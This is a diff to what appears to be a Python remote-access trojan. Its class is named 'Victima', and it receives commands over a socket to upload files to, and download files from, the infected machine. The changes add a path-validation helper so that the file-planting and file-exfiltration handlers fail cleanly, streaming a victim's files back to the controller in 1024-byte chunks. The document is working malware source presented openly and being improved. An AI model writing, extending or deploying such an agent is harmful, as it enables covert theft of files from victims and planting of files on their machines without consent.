@@ -1,6 +1,7 @@
 
 # LIBRERIAS STANDARD
 
+import re
 import os
 import sys
 import time
@@ -121,6 +122,7 @@ class Victima(object):
 				self.detener()
 				break
 
+
 			# ARCHIVOS	
 
 			elif (datosEleccion=="subir"):
@@ -163,6 +165,21 @@ class Victima(object):
 		return
 
 
+	# -------- CONTROLADORES DEL PROGRAMA ---------
+
+	def control_ruta(self,path,signo):
+		
+		ruta = path.split(signo)
+		if (ruta.pop()!=""):
+			verificar_ruta = signo.join(ruta)
+
+			if (os.path.exists(verificar_ruta)):
+				return True
+			else:
+				return False
+		else:
+			return False
+		
 
 	# -------- MODULOS DE CONTROL --------
 
@@ -226,8 +243,16 @@ class Victima(object):
 		self.enviar('ok')
 
 		# Recibe la ruta de destino donde se va a guardar el archivo y envia el 'ok'
-		destino = self.recibir()
-		self.enviar('ok')
+		ruta = self.recibir()
+		destino = ruta
+
+		if (self.control_ruta(ruta,"/")) or (self.control_ruta(ruta,"\\")):
+			self.enviar('ok')
+
+		else:
+			self.enviar('failed')
+			return False
+
 
 		size = int(self.recibir())
 		self.enviar('ok')
@@ -248,23 +273,32 @@ class Victima(object):
 
 	def descargar_archivos(self):
 
-		# Envia el ok
+		# Envia el ok del modo
 		self.enviar('ok')
 
 		# Recibe ruta origen
-		origen = self.recibir()
+		path = self.recibir()
+		origen = path
 
-		# Envia tamanio del archivo origen
-		self.enviar(str(os.path.getsize(origen)))
-		self.recibir()
-		time.sleep(1)
+		if (self.control_ruta(path,"/")) or (self.control_ruta(path,"\\")):
 
-		# Se prepara para el envio de datos del archivo
-		with open(origen, "rb") as archivo_origen:
-				contenido = archivo_origen.read(1024)
-				while contenido:
-					self.client.sendall(contenido)
-					contenido = archivo_origen.read(1024) 
+			if (os.path.exists(origen)):
+				# Envia tamanio del archivo origen
+				self.enviar(str(os.path.getsize(origen)))
+				self.recibir()
+				time.sleep(1)
+
+				# Se prepara para el envio de datos del archivo
+				with open(origen, "rb") as archivo_origen:
+						contenido = archivo_origen.read(1024)
+						while contenido:
+							self.client.sendall(contenido)
+							contenido = archivo_origen.read(1024)
+			else:
+				 self.enviar(str('-1'))
+
+		else:
+			self.enviar(str('-1'))
 
 		return 
 
